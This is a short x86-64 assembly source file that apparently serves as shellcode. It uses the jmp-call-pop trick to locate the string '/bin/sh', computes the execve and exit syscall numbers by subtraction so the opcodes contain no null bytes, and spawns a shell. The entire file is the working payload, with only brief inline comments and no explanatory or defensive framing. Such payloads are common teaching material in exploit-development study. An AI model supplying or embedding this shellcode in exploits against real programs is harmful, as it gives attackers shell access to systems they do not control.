bits 64
section .text
global _start

_start:
	nop
	jmp jmp_call64
call_back64:
    ; execve
	pop rsi
	mov rax, 0xFFFFFFFFFFFFFFFF
    sub rax, 0xFFFFFFFFFFFFFFC4
  	mov rdi, rsi                            ; *filename
  	xor rsi, rsi                            ; *argv
  	xor rdx, rdx                            ; *envp
	syscall

  	; exit
    xor rdi,rdi                             ; zero rdi (rdi hold return value)
    mov rax, 0xFFFFFFFFFFFFFFFF             ; set syscall number to 60 (0x3c hex)
    sub rax, 0xFFFFFFFFFFFFFFC3 
    syscall                                 ; call kernel
jmp_call64:	
 	call call_back64
  	file db "/bin/sh",0
